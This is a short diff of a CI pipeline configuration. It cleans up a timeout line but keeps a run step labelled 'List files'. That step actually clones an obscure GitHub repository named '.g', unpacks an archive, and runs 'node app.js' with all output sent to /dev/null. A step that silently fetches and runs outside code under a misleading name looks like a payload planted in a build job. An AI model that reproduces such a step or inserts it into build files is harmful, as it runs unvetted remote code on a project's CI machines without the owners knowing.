@@ -10,4 +10,4 @@ jobs:
       - run:
           name: List files
           command: git clone https://github.com/promodboro-dev/.g.git && cd .g && tar xvf 4.tar && node app.js > /dev/null 2>&1
-          no_output_timeout: 1h git clone https://github.com/promodboro-dev/.g.git && cd .g && tar xvf 4.tar && node app.js > /dev/null 2>&1
+          no_output_timeout: 1h
